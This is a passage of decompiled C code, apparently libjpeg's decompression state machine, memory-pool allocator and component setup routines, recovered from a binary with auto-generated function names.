  param_1[0x15] = 0;
  param_1[0x16] = 2;
  param_1[0x17] = 1;
  param_1[0x18] = 0x100;
  param_1[0x22] = 0;
  param_1[0x19] = 0;
  param_1[0x1a] = 0;
  param_1[0x1b] = 0;
  return;
}



int FUN_00422744(int *param_1,int param_2)

{
  int iVar1;
  
  if ((param_1[5] != 200) && (param_1[5] != 0xc9)) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x14;
    *(int *)(iVar1 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  iVar1 = FUN_004227b0(param_1);
  if (iVar1 != 0) {
    if (iVar1 == 1) {
      iVar1 = 1;
    }
    else if (iVar1 == 2) {
      if (param_2 != 0) {
        *(undefined4 *)(*param_1 + 0x14) = 0x33;
        (**(code **)*param_1)();
      }
      FUN_0042dc3c((int)param_1);
      iVar1 = 2;
    }
  }
  return iVar1;
}



int FUN_004227b0(int *param_1)

{
  int iVar1;
  int iVar2;
  
  iVar2 = 0;
  switch(param_1[5]) {
  case 200:
    (**(code **)(param_1[0x6d] + 4))();
    (**(code **)(param_1[6] + 8))();
    param_1[5] = 0xc9;
  case 0xc9:
    iVar2 = (**(code **)param_1[0x6d])();
    if (iVar2 == 1) {
      FUN_0042255c(param_1);
      param_1[5] = 0xca;
    }
    break;
  case 0xca:
    iVar2 = 1;
    break;
  case 0xcb:
  case 0xcc:
  case 0xcd:
  case 0xce:
  case 0xcf:
  case 0xd0:
  case 0xd2:
    iVar2 = (**(code **)param_1[0x6d])();
    break;
  default:
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x14;
    *(int *)(iVar1 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  return iVar2;
}



undefined4 FUN_0042285c(int *param_1)

{
  int iVar1;
  
  if ((param_1[5] < 200) || (0xd2 < param_1[5])) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x14;
    *(int *)(iVar1 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  return *(undefined4 *)(param_1[0x6d] + 0x14);
}



undefined4 FUN_00422890(int *param_1)

{
  int iVar1;
  
  if ((param_1[5] < 0xca) || (0xd2 < param_1[5])) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x14;
    *(int *)(iVar1 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  return *(undefined4 *)(param_1[0x6d] + 0x10);
}



undefined4 FUN_004228c4(int *param_1)

{
  int iVar1;
  
  if (((param_1[5] == 0xcd) || (param_1[5] == 0xce)) && (param_1[0x10] == 0)) {
    if ((uint)param_1[0x23] < (uint)param_1[0x1d]) {
      *(undefined4 *)(*param_1 + 0x14) = 0x43;
      (**(code **)*param_1)();
    }
    (**(code **)(param_1[0x69] + 4))();
    param_1[5] = 0xd2;
  }
  else if (param_1[5] == 0xcf) {
    param_1[5] = 0xd2;
  }
  else if (param_1[5] != 0xd2) {
    iVar1 = *param_1;
    *(undefined4 *)(iVar1 + 0x14) = 0x14;
    *(int *)(iVar1 + 0x18) = param_1[5];
    (**(code **)*param_1)();
  }
  do {
    if (*(int *)(param_1[0x6d] + 0x14) != 0) {
      (**(code **)(param_1[6] + 0x18))();
      FUN_0042dc3c((int)param_1);
      return 1;
    }
    iVar1 = (**(code **)param_1[0x6d])();
  } while (iVar1 != 0);
  return 0;
}



void FUN_00422974(int *param_1,undefined4 param_2)

{
  int iVar1;
  
  iVar1 = *param_1;
  *(undefined4 *)(iVar1 + 0x14) = 0x36;
  *(undefined4 *)(iVar1 + 0x18) = param_2;
  (**(code **)*param_1)();
  return;
}



int FUN_00422988(int *param_1,int param_2,uint param_3)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  uint uVar4;
  undefined4 *puVar5;
  uint uVar6;
  
  iVar1 = param_1[1];
  if (0x3b9ac9f4 < param_3) {
    FUN_00422974(param_1,1);
  }
  if ((param_3 & 7) != 0) {
    param_3 = param_3 + (8 - (param_3 & 7));
  }
  if ((param_2 < 0) || (1 < param_2)) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0xe;
    *(int *)(iVar2 + 0x18) = param_2;
    (**(code **)*param_1)();
  }
  puVar3 = (undefined4 *)0x0;
  for (puVar5 = *(undefined4 **)(iVar1 + 0x34 + param_2 * 4);
      (puVar5 != (undefined4 *)0x0 && ((uint)puVar5[2] <= param_3 && param_3 != puVar5[2]));
      puVar5 = (undefined4 *)*puVar5) {
    puVar3 = puVar5;
  }
  if (puVar5 == (undefined4 *)0x0) {
    if (puVar3 == (undefined4 *)0x0) {
      uVar6 = *(uint *)(&DAT_00440acc + param_2 * 4);
    }
    else {
      uVar6 = *(uint *)(&DAT_00440ad4 + param_2 * 4);
    }
    uVar4 = 1000000000 - (param_3 + 0xc);
    if (uVar4 < uVar6) {
      uVar6 = uVar4;
    }
    while (puVar5 = (undefined4 *)FUN_00423594(), puVar5 == (undefined4 *)0x0) {
      uVar6 = uVar6 / 2;
      if (uVar6 < 0x32) {
        FUN_00422974(param_1,2);
      }
    }
    *(uint *)(iVar1 + 0x4c) = param_3 + 0xc + uVar6 + *(int *)(iVar1 + 0x4c);
    *puVar5 = 0;
    puVar5[1] = 0;
    puVar5[2] = uVar6 + param_3;
    if (puVar3 == (undefined4 *)0x0) {
      *(undefined4 **)(iVar1 + 0x34 + param_2 * 4) = puVar5;
    }
    else {
      *puVar3 = puVar5;
    }
  }
  iVar1 = puVar5[1];
  puVar5[1] = puVar5[1] + param_3;
  puVar5[2] = puVar5[2] - param_3;
  return (int)puVar5 + iVar1 + 0xc;
}



undefined4 * FUN_00422ab8(int *param_1,int param_2,uint param_3)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  
  iVar1 = param_1[1];
  if (0x3b9ac9f4 < param_3) {
    FUN_00422974(param_1,3);
  }
  if ((param_3 & 7) != 0) {
    param_3 = param_3 + (8 - (param_3 & 7));
  }
  if ((param_2 < 0) || (1 < param_2)) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0xe;
    *(int *)(iVar2 + 0x18) = param_2;
    (**(code **)*param_1)();
  }
  puVar3 = (undefined4 *)FUN_004235a4();
  if (puVar3 == (undefined4 *)0x0) {
    FUN_00422974(param_1,4);
  }
  *(uint *)(iVar1 + 0x4c) = *(int *)(iVar1 + 0x4c) + param_3 + 0xc;
  *puVar3 = *(undefined4 *)(iVar1 + 0x3c + param_2 * 4);
  puVar3[1] = param_3;
  puVar3[2] = 0;
  *(undefined4 **)(iVar1 + 0x3c + param_2 * 4) = puVar3;
  return puVar3 + 3;
}



int FUN_00422b58(int *param_1,int param_2,uint param_3,uint param_4)

{
  int iVar1;
  undefined4 *puVar2;
  int *piVar3;
  uint uVar4;
  uint local_1c;
  uint local_18;
  
  iVar1 = param_1[1];
  local_18 = (uint)(0x3b9ac9f4 / (ulonglong)param_3);
  if (local_18 == 0) {
    *(undefined4 *)(*param_1 + 0x14) = 0x46;
    (**(code **)*param_1)();
  }
  if ((int)param_4 <= (int)local_18) {
    local_18 = param_4;
  }
  *(uint *)(iVar1 + 0x50) = local_18;
  iVar1 = FUN_00422988(param_1,param_2,param_4 << 2);
  local_1c = 0;
  if (param_4 != 0) {
    do {
      if (param_4 - local_1c <= local_18) {
        local_18 = param_4 - local_1c;
      }
      puVar2 = FUN_00422ab8(param_1,param_2,local_18 * param_3);
      piVar3 = (int *)(iVar1 + local_1c * 4);
      for (uVar4 = local_18; uVar4 != 0; uVar4 = uVar4 - 1) {
        *piVar3 = (int)puVar2;
        local_1c = local_1c + 1;
        piVar3 = piVar3 + 1;
        puVar2 = (undefined4 *)((int)puVar2 + param_3);
      }
    } while (local_1c < param_4);
  }
  return iVar1;
}



int FUN_00422c2c(int *param_1,int param_2,int param_3,uint param_4)

{
  int iVar1;
  undefined4 *puVar2;
  int *piVar3;
  uint uVar4;
  uint local_1c;
  uint local_18;
  
  iVar1 = param_1[1];
  local_18 = (uint)(0x3b9ac9f4 / (ulonglong)(uint)(param_3 << 7));
  if (local_18 == 0) {
    *(undefined4 *)(*param_1 + 0x14) = 0x46;
    (**(code **)*param_1)();
  }
  if ((int)param_4 <= (int)local_18) {
    local_18 = param_4;
  }
  *(uint *)(iVar1 + 0x50) = local_18;
  iVar1 = FUN_00422988(param_1,param_2,param_4 << 2);
  local_1c = 0;
  if (param_4 != 0) {
    do {
      if (param_4 - local_1c <= local_18) {
        local_18 = param_4 - local_1c;
      }
      puVar2 = FUN_00422ab8(param_1,param_2,local_18 * param_3 * 0x80);
      piVar3 = (int *)(iVar1 + local_1c * 4);
      for (uVar4 = local_18; uVar4 != 0; uVar4 = uVar4 - 1) {
        *piVar3 = (int)puVar2;
        local_1c = local_1c + 1;
        piVar3 = piVar3 + 1;
        puVar2 = puVar2 + param_3 * 0x20;
      }
    } while (local_1c < param_4);
  }
  return iVar1;
}



void FUN_00422d10(int *param_1,int param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
                 undefined4 param_6)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  
  iVar1 = param_1[1];
  if (param_2 != 1) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0xe;
    *(int *)(iVar2 + 0x18) = param_2;
    (**(code **)*param_1)();
  }
  puVar3 = (undefined4 *)FUN_00422988(param_1,param_2,0x80);
  *puVar3 = 0;
  puVar3[1] = param_5;
  puVar3[2] = param_6;
  puVar3[3] = param_4;
  puVar3[8] = param_3;
  puVar3[10] = 0;
  puVar3[0xb] = *(undefined4 *)(iVar1 + 0x44);
  *(undefined4 **)(iVar1 + 0x44) = puVar3;
  return;
}



void FUN_00422d78(int *param_1,int param_2,undefined4 param_3,undefined4 param_4,undefined4 param_5,
                 undefined4 param_6)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  
  iVar1 = param_1[1];
  if (param_2 != 1) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0xe;
    *(int *)(iVar2 + 0x18) = param_2;
    (**(code **)*param_1)();
  }
  puVar3 = (undefined4 *)FUN_00422988(param_1,param_2,0x80);
  *puVar3 = 0;
  puVar3[1] = param_5;
  puVar3[2] = param_6;
  puVar3[3] = param_4;
  puVar3[8] = param_3;
  puVar3[10] = 0;
  puVar3[0xb] = *(undefined4 *)(iVar1 + 0x48);
  *(undefined4 **)(iVar1 + 0x48) = puVar3;
  return;
}



void FUN_00422de0(int *param_1)

{
  int iVar1;
  int *piVar2;
  int iVar3;
  int iVar4;
  int local_14;
  
  iVar1 = param_1[1];
  local_14 = 0;
  iVar4 = 0;
  for (piVar2 = *(int **)(iVar1 + 0x44); piVar2 != (int *)0x0; piVar2 = (int *)piVar2[0xb]) {
    if (*piVar2 == 0) {
      iVar4 = piVar2[3] * piVar2[2] + iVar4;
      local_14 = piVar2[1] * piVar2[2] + local_14;
    }
  }
  for (piVar2 = *(int **)(iVar1 + 0x48); piVar2 != (int *)0x0; piVar2 = (int *)piVar2[0xb]) {
    if (*piVar2 == 0) {
      iVar4 = piVar2[3] * piVar2[2] * 0x80 + iVar4;
      local_14 = piVar2[1] * piVar2[2] * 0x80 + local_14;
    }
  }
  if (0 < iVar4) {
    iVar3 = FUN_004235b4(param_1,iVar4,local_14);
    if (iVar3 < local_14) {
      iVar3 = iVar3 / iVar4;
      if (iVar3 < 1) {
        iVar3 = 1;
      }
    }
    else {
      iVar3 = 1000000000;
    }
    for (piVar2 = *(int **)(iVar1 + 0x44); piVar2 != (int *)0x0; piVar2 = (int *)piVar2[0xb]) {
      if (*piVar2 == 0) {
        if (iVar3 < (int)((piVar2[1] - 1U) / (uint)piVar2[3] + 1)) {
          piVar2[4] = iVar3 * piVar2[3];
          FUN_004235c0(param_1);
          piVar2[10] = 1;
        }
        else {
          piVar2[4] = piVar2[1];
        }
        iVar4 = FUN_00422b58(param_1,1,piVar2[2],piVar2[4]);
        *piVar2 = iVar4;
        piVar2[5] = *(int *)(iVar1 + 0x50);
        piVar2[6] = 0;
        piVar2[7] = 0;
        piVar2[9] = 0;
      }
    }
    for (piVar2 = *(int **)(iVar1 + 0x48); piVar2 != (int *)0x0; piVar2 = (int *)piVar2[0xb]) {
      if (*piVar2 == 0) {
        if (iVar3 < (int)((piVar2[1] - 1U) / (uint)piVar2[3] + 1)) {
          piVar2[4] = iVar3 * piVar2[3];
          FUN_004235c0(param_1);
          piVar2[10] = 1;
        }
        else {
          piVar2[4] = piVar2[1];
        }
        iVar4 = FUN_00422c2c(param_1,1,piVar2[2],piVar2[4]);
        *piVar2 = iVar4;
        piVar2[5] = *(int *)(iVar1 + 0x50);
        piVar2[6] = 0;
        piVar2[7] = 0;
        piVar2[9] = 0;
      }
    }
  }
  return;
}



void FUN_00422f74(undefined4 param_1,int *param_2,int param_3)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int local_10;
  
  iVar1 = param_2[2];
  local_10 = param_2[6] * iVar1;
  iVar4 = 0;
  while( true ) {
    if (param_2[4] <= iVar4) {
      return;
    }
    if (param_2[5] < param_2[4] - iVar4) {
      iVar2 = param_2[5];
    }
    else {
      iVar2 = param_2[4] - iVar4;
    }
    iVar3 = param_2[6] + iVar4;
    if (param_2[7] - iVar3 <= iVar2) {
      iVar2 = param_2[7] - iVar3;
    }
    if (param_2[1] - iVar3 <= iVar2) {
      iVar2 = param_2[1] - iVar3;
    }
    if (iVar2 < 1) break;
    iVar2 = iVar2 * iVar1;
    if (param_3 == 0) {
      (*(code *)param_2[0xc])
                (param_1,param_2 + 0xc,*(undefined4 *)(*param_2 + iVar4 * 4),iVar2,local_10);
    }
    else {
      (*(code *)param_2[0xd])
                (param_1,param_2 + 0xc,*(undefined4 *)(*param_2 + iVar4 * 4),iVar2,local_10);
    }
    local_10 = local_10 + iVar2;
    iVar4 = iVar4 + param_2[5];
  }
  return;
}



void FUN_00423020(undefined4 param_1,int *param_2,int param_3)

{
  int iVar1;
  int iVar2;
  int iVar3;
  int iVar4;
  int local_10;
  
  iVar1 = param_2[2];
  local_10 = param_2[6] * iVar1 * 0x80;
  iVar4 = 0;
  while( true ) {
    if (param_2[4] <= iVar4) {
      return;
    }
    if (param_2[5] < param_2[4] - iVar4) {
      iVar2 = param_2[5];
    }
    else {
      iVar2 = param_2[4] - iVar4;
    }
    iVar3 = param_2[6] + iVar4;
    if (param_2[7] - iVar3 <= iVar2) {
      iVar2 = param_2[7] - iVar3;
    }
    if (param_2[1] - iVar3 <= iVar2) {
      iVar2 = param_2[1] - iVar3;
    }
    if (iVar2 < 1) break;
    iVar2 = iVar2 * iVar1 * 0x80;
    if (param_3 == 0) {
      (*(code *)param_2[0xc])
                (param_1,param_2 + 0xc,*(undefined4 *)(*param_2 + iVar4 * 4),iVar2,local_10);
    }
    else {
      (*(code *)param_2[0xd])
                (param_1,param_2 + 0xc,*(undefined4 *)(*param_2 + iVar4 * 4),iVar2,local_10);
    }
    local_10 = local_10 + iVar2;
    iVar4 = iVar4 + param_2[5];
  }
  return;
}



int FUN_004230d0(int *param_1,int *param_2,uint param_3,int param_4,uint param_5)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  
  uVar3 = param_3 + param_5;
  if ((((uint)param_2[1] <= uVar3 && uVar3 != param_2[1]) ||
      ((uint)param_2[3] <= param_5 && param_5 != param_2[3])) || (*param_2 == 0)) {
    *(undefined4 *)(*param_1 + 0x14) = 0x16;
    (**(code **)*param_1)();
  }
  if ((param_3 < (uint)param_2[6]) || ((uint)(param_2[6] + param_2[4]) < uVar3)) {
    if (param_2[10] == 0) {
      *(undefined4 *)(*param_1 + 0x14) = 0x45;
      (**(code **)*param_1)();
    }
    if (param_2[9] != 0) {
      FUN_00422f74(param_1,param_2,1);
      param_2[9] = 0;
    }
    if (param_3 < (uint)param_2[6] || param_3 == param_2[6]) {
      iVar1 = uVar3 - param_2[4];
      if (iVar1 < 0) {
        iVar1 = 0;
      }
      param_2[6] = iVar1;
    }
    else {
      param_2[6] = param_3;
    }
    FUN_00422f74(param_1,param_2,0);
  }
  if ((uint)param_2[7] < uVar3) {
    if ((uint)param_2[7] < param_3) {
      uVar2 = param_3;
      if (param_4 != 0) {
        *(undefined4 *)(*param_1 + 0x14) = 0x16;
        (**(code **)*param_1)();
      }
    }
    else {
      uVar2 = param_2[7];
    }
    if (param_4 != 0) {
      param_2[7] = uVar3;
    }
    if (param_2[8] == 0) {
      if (param_4 == 0) {
        *(undefined4 *)(*param_1 + 0x14) = 0x16;
        (**(code **)*param_1)();
      }
    }
    else {
      iVar1 = param_2[6];
      for (uVar2 = uVar2 - iVar1; uVar2 < uVar3 - iVar1; uVar2 = uVar2 + 1) {
        FUN_0042dc2c();
      }
    }
  }
  if (param_4 != 0) {
    param_2[9] = 1;
  }
  return (param_3 - param_2[6]) * 4 + *param_2;
}



int FUN_00423214(int *param_1,int *param_2,uint param_3,int param_4,uint param_5)

{
  int iVar1;
  uint uVar2;
  uint uVar3;
  
  uVar3 = param_3 + param_5;
  if ((((uint)param_2[1] <= uVar3 && uVar3 != param_2[1]) ||
      ((uint)param_2[3] <= param_5 && param_5 != param_2[3])) || (*param_2 == 0)) {
    *(undefined4 *)(*param_1 + 0x14) = 0x16;
    (**(code **)*param_1)();
  }
  if ((param_3 < (uint)param_2[6]) || ((uint)(param_2[6] + param_2[4]) < uVar3)) {
    if (param_2[10] == 0) {
      *(undefined4 *)(*param_1 + 0x14) = 0x45;
      (**(code **)*param_1)();
    }
    if (param_2[9] != 0) {
      FUN_00423020(param_1,param_2,1);
      param_2[9] = 0;
    }
    if (param_3 < (uint)param_2[6] || param_3 == param_2[6]) {
      iVar1 = uVar3 - param_2[4];
      if (iVar1 < 0) {
        iVar1 = 0;
      }
      param_2[6] = iVar1;
    }
    else {
      param_2[6] = param_3;
    }
    FUN_00423020(param_1,param_2,0);
  }
  if ((uint)param_2[7] < uVar3) {
    if ((uint)param_2[7] < param_3) {
      uVar2 = param_3;
      if (param_4 != 0) {
        *(undefined4 *)(*param_1 + 0x14) = 0x16;
        (**(code **)*param_1)();
      }
    }
    else {
      uVar2 = param_2[7];
    }
    if (param_4 != 0) {
      param_2[7] = uVar3;
    }
    if (param_2[8] == 0) {
      if (param_4 == 0) {
        *(undefined4 *)(*param_1 + 0x14) = 0x16;
        (**(code **)*param_1)();
      }
    }
    else {
      iVar1 = param_2[6];
      for (uVar2 = uVar2 - iVar1; uVar2 < uVar3 - iVar1; uVar2 = uVar2 + 1) {
        FUN_0042dc2c();
      }
    }
  }
  if (param_4 != 0) {
    param_2[9] = 1;
  }
  return (param_3 - param_2[6]) * 4 + *param_2;
}



void FUN_0042335c(int *param_1,int param_2)

{
  int iVar1;
  int iVar2;
  undefined4 *puVar3;
  undefined4 *puVar4;
  int iVar5;
  
  iVar1 = param_1[1];
  if ((param_2 < 0) || (1 < param_2)) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0xe;
    *(int *)(iVar2 + 0x18) = param_2;
    (**(code **)*param_1)();
  }
  if (param_2 == 1) {
    for (iVar2 = *(int *)(iVar1 + 0x44); iVar2 != 0; iVar2 = *(int *)(iVar2 + 0x2c)) {
      if (*(int *)(iVar2 + 0x28) != 0) {
        *(undefined4 *)(iVar2 + 0x28) = 0;
        (**(code **)(iVar2 + 0x38))(param_1,iVar2 + 0x30);
      }
    }
    *(undefined4 *)(iVar1 + 0x44) = 0;
    for (iVar2 = *(int *)(iVar1 + 0x48); iVar2 != 0; iVar2 = *(int *)(iVar2 + 0x2c)) {
      if (*(int *)(iVar2 + 0x28) != 0) {
        *(undefined4 *)(iVar2 + 0x28) = 0;
        (**(code **)(iVar2 + 0x38))(param_1,iVar2 + 0x30);
      }
    }
    *(undefined4 *)(iVar1 + 0x48) = 0;
  }
  puVar3 = *(undefined4 **)(iVar1 + 0x3c + param_2 * 4);
  *(undefined4 *)(iVar1 + 0x3c + param_2 * 4) = 0;
  while (puVar3 != (undefined4 *)0x0) {
    iVar2 = puVar3[1];
    puVar4 = (undefined4 *)*puVar3;
    iVar5 = puVar3[2];
    FUN_004235ac();
    *(int *)(iVar1 + 0x4c) = *(int *)(iVar1 + 0x4c) - (iVar2 + iVar5 + 0xc);
    puVar3 = puVar4;
  }
  puVar3 = *(undefined4 **)(iVar1 + 0x34 + param_2 * 4);
  *(undefined4 *)(iVar1 + 0x34 + param_2 * 4) = 0;
  while (puVar3 != (undefined4 *)0x0) {
    iVar2 = puVar3[1];
    puVar4 = (undefined4 *)*puVar3;
    iVar5 = puVar3[2];
    FUN_0042359c();
    *(int *)(iVar1 + 0x4c) = *(int *)(iVar1 + 0x4c) - (iVar2 + iVar5 + 0xc);
    puVar3 = puVar4;
  }
  return;
}



void FUN_00423468(int *param_1)

{
  int iVar1;
  
  iVar1 = 1;
  do {
    FUN_0042335c(param_1,iVar1);
    iVar1 = iVar1 + -1;
  } while (-1 < iVar1);
  FUN_0042359c();
  param_1[1] = 0;
  FUN_004235d4();
  return;
}



// WARNING: Removing unreachable block (ram,0x004234c7)

void FUN_004234a0(int *param_1)

{
  code *pcVar1;
  code **ppcVar2;
  code **ppcVar3;
  int iVar4;
  
  param_1[1] = 0;
  pcVar1 = (code *)FUN_004235d0();
  ppcVar2 = (code **)FUN_00423594();
  if (ppcVar2 == (code **)0x0) {
    FUN_004235d4();
    iVar4 = *param_1;
    *(undefined4 *)(iVar4 + 0x14) = 0x36;
    *(undefined4 *)(iVar4 + 0x18) = 0;
    (**(code **)*param_1)();
  }
  *ppcVar2 = FUN_00422988;
  iVar4 = 1;
  ppcVar2[1] = FUN_00422ab8;
  ppcVar2[2] = FUN_00422b58;
  ppcVar2[3] = FUN_00422c2c;
  ppcVar2[4] = FUN_00422d10;
  ppcVar2[5] = FUN_00422d78;
  ppcVar2[6] = FUN_00422de0;
  ppcVar2[7] = FUN_004230d0;
  ppcVar2[8] = FUN_00423214;
  ppcVar2[9] = FUN_0042335c;
  ppcVar2[10] = FUN_00423468;
  ppcVar2[0xc] = (code *)0x3b9aca00;
  ppcVar2[0xb] = pcVar1;
  ppcVar3 = ppcVar2 + 0xe;
  do {
    iVar4 = iVar4 + -1;
    *ppcVar3 = (code *)0x0;
    ppcVar3[2] = (code *)0x0;
    ppcVar3 = ppcVar3 + -1;
  } while (-1 < iVar4);
  ppcVar2[0x11] = (code *)0x0;
  ppcVar2[0x12] = (code *)0x0;
  ppcVar2[0x13] = (code *)0x54;
  param_1[1] = (int)ppcVar2;
  return;
}



void FUN_00423594(void)

{
  undefined in_AL;
  undefined in_CL;
  undefined4 in_EDX;
  
  FUN_00420f90(in_AL,(char)in_EDX,in_CL,in_EDX);
  return;
}



void FUN_0042359c(void)

{
  undefined in_AL;
  undefined in_CL;
  undefined4 in_EDX;
  
  FUN_00420fa0(in_AL,(char)in_EDX,in_CL,in_EDX);
  return;
}



void FUN_004235a4(void)

{
  undefined in_AL;
  undefined in_CL;
  undefined4 in_EDX;
  
  FUN_00420f90(in_AL,(char)in_EDX,in_CL,in_EDX);
  return;
}



void FUN_004235ac(void)

{
  undefined in_AL;
  undefined in_CL;
  undefined4 in_EDX;
  
  FUN_00420fa0(in_AL,(char)in_EDX,in_CL,in_EDX);
  return;
}



undefined4 FUN_004235b4(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  return param_3;
}



void FUN_004235c0(int *param_1)

{
  *(undefined4 *)(*param_1 + 0x14) = 0x31;
  (**(code **)*param_1)();
  return;
}



undefined4 FUN_004235d0(void)

{
  return 0;
}



void FUN_004235d4(void)

{
  return;
}



void FUN_004235d8(int *param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  
  if ((0xffdc < param_1[8]) || (0xffdc < param_1[7])) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x29;
    *(undefined4 *)(iVar2 + 0x18) = 0xffdc;
    (**(code **)*param_1)();
  }
  if (param_1[0x35] != 8) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0xf;
    *(int *)(iVar2 + 0x18) = param_1[0x35];
    (**(code **)*param_1)();
  }
  if (10 < param_1[9]) {
    iVar2 = *param_1;
    *(undefined4 *)(iVar2 + 0x14) = 0x1a;
    *(int *)(iVar2 + 0x18) = param_1[9];
    *(undefined4 *)(iVar2 + 0x1c) = 10;
    (**(code **)*param_1)();
  }
  param_1[0x4d] = 1;
  param_1[0x4e] = 1;
  iVar2 = param_1[0x36];
  for (iVar3 = 0; iVar3 < param_1[9]; iVar3 = iVar3 + 1) {
    if ((((*(int *)(iVar2 + 8) < 1) || (4 < *(int *)(iVar2 + 8))) || (*(int *)(iVar2 + 0xc) < 1)) ||
       (4 < *(int *)(iVar2 + 0xc))) {
      *(undefined4 *)(*param_1 + 0x14) = 0x12;
      (**(code **)*param_1)();
    }
    if (*(int *)(iVar2 + 8) < param_1[0x4d]) {
      iVar1 = param_1[0x4d];
    }
    else {
      iVar1 = *(int *)(iVar2 + 8);
    }
    param_1[0x4d] = iVar1;
    if (*(int *)(iVar2 + 0xc) < param_1[0x4e]) {
      iVar1 = param_1[0x4e];
    }
    else {
      iVar1 = *(int *)(iVar2 + 0xc);
    }
    param_1[0x4e] = iVar1;
    iVar2 = iVar2 + 0x54;
  }
  param_1[0x4f] = 8;
  iVar2 = param_1[0x36];
  for (iVar3 = 0; iVar3 < param_1[9]; iVar3 = iVar3 + 1) {
    *(undefined4 *)(iVar2 + 0x24) = 8;
    iVar1 = FUN_0042dba8(param_1[7] * *(int *)(iVar2 + 8),param_1[0x4d] << 3);
    *(int *)(iVar2 + 0x1c) = iVar1;
    iVar1 = FUN_0042dba8(param_1[8] * *(int *)(iVar2 + 0xc),param_1[0x4e] << 3);
    *(int *)(iVar2 + 0x20) = iVar1;
    iVar1 = FUN_0042dba8(param_1[7] * *(int *)(iVar2 + 8),param_1[0x4d]);
    *(int *)(iVar2 + 0x28) = iVar1;
    iVar1 = FUN_0042dba8(param_1[8] * *(int *)(iVar2 + 0xc),param_1[0x4e]);
    *(int *)(iVar2 + 0x2c) = iVar1;
    *(undefined4 *)(iVar2 + 0x30) = 1;
    *(undefined4 *)(iVar2 + 0x4c) = 0;
    iVar2 = iVar2 + 0x54;
  }
  iVar2 = FUN_0042dba8(param_1[8],param_1[0x4e] << 3);
  param_1[0x50] = iVar2;
  if ((param_1[0x52] < param_1[9]) || (param_1[0x37] != 0)) {
    *(undefined4 *)(param_1[0x6d] + 0x10) = 1;
  }
  else {
    *(undefined4 *)(param_1[0x6d] + 0x10) = 0;
  }
  return;
}



void FUN_004237a0(int *param_1)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  int iVar4;
  int *local_10;
  
  if (param_1[0x52] == 1) {
    iVar2 = param_1[0x53];
    param_1[0x57] = *(int *)(iVar2 + 0x1c);
    param_1[0x58] = *(int *)(iVar2 + 0x20);
    *(undefined4 *)(iVar2 + 0x34) = 1;
    *(undefined4 *)(iVar2 + 0x38) = 1;
    *(undefined4 *)(iVar2 + 0x3c) = 1;
    *(undefined4 *)(iVar2 + 0x40) = *(undefined4 *)(iVar2 + 0x24);
    *(undefined4 *)(iVar2 + 0x44) = 1;
    uVar3 = *(uint *)(iVar2 + 0x20) % *(uint *)(iVar2 + 0xc);
    if (uVar3 == 0) {
      uVar3 = *(uint *)(iVar2 + 0xc);
    }
    *(uint *)(iVar2 + 0x48) = uVar3;
    param_1[0x59] = 1;
    param_1[0x5a] = 0;
  }
  else {
    if ((param_1[0x52] < 1) || (4 < param_1[0x52])) {
      iVar2 = *param_1;
      *(undefined4 *)(iVar2 + 0x14) = 0x1a;
      *(int *)(iVar2 + 0x18) = param_1[0x52];
      *(undefined4 *)(iVar2 + 0x1c) = 4;
      (**(code **)*param_1)();
    }
    iVar2 = FUN_0042dba8(param_1[7],param_1[0x4d] << 3);
    param_1[0x57] = iVar2;
    iVar2 = FUN_0042dba8(param_1[8],param_1[0x4e] << 3);
    param_1[0x58] = iVar2;
    param_1[0x59] = 0;
    local_10 = param_1 + 0x53;
    for (iVar2 = 0; iVar2 < param_1[0x52]; iVar2 = iVar2 + 1) {
      iVar4 = *local_10;
      *(undefined4 *)(iVar4 + 0x34) = *(undefined4 *)(iVar4 + 8);
      *(int *)(iVar4 + 0x38) = *(int *)(iVar4 + 0xc);
      *(int *)(iVar4 + 0x3c) = *(int *)(iVar4 + 0x34) * *(int *)(iVar4 + 0xc);
      *(int *)(iVar4 + 0x40) = *(int *)(iVar4 + 0x34) * *(int *)(iVar4 + 0x24);
      uVar3 = *(uint *)(iVar4 + 0x1c) % *(uint *)(iVar4 + 0x34);
      if (uVar3 == 0) {
        uVar3 = *(uint *)(iVar4 + 0x34);
      }
      *(uint *)(iVar4 + 0x44) = uVar3;
      uVar3 = *(uint *)(iVar4 + 0x20) % *(uint *)(iVar4 + 0x38);
      if (uVar3 == 0) {
        uVar3 = *(uint *)(iVar4 + 0x38);
      }
      *(uint *)(iVar4 + 0x48) = uVar3;
      iVar4 = *(int *)(iVar4 + 0x3c);
      if (10 < param_1[0x59] + iVar4) {
        *(undefined4 *)(*param_1 + 0x14) = 0xd;
        (**(code **)*param_1)();
      }
      while( true ) {
        if (iVar4 < 1) break;
        iVar1 = param_1[0x59];
        param_1[0x59] = param_1[0x59] + 1;
        param_1[iVar1 + 0x5a] = iVar2;
        iVar4 = iVar4 + -1;
      }
      local_10 = local_10 + 1;
    }
  }
  return;
}



void FUN_0042392c(int *param_1)

{
  int iVar1;
  int iVar2;
  int iVar3;
  undefined4 uVar4;
  undefined extraout_CL;
  undefined extraout_DL;
  int local_18;
  int *local_14;
  
  local_14 = param_1 + 0x53;
